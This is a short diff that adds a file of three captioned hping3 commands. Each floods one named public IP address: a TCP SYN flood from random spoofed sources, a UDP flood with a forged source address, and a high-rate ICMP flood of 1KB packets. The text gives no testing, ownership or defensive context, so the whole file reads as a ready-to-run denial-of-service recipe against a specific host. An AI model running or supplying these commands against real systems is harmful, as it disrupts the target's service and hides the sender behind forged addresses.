@@ -1,0 +1,1 @@
+¥ Send 10,000 TCP packets from random source IPs:sudo hping3 -c 10000 -S --rand-source 137.184.173.203¥ Send 9,000 UDP packets in 90 seconds from a spoofed source:sudo hping3 -c 9000 -2 -i u10000 --spoof 192.168.1.100 137.184.173.203¥ Send 11,000 ICMP packets (1KB size, 75/sec):sudo hping3 -c 11000 --icmp -d 1024 -i u13333 137.184.173.203
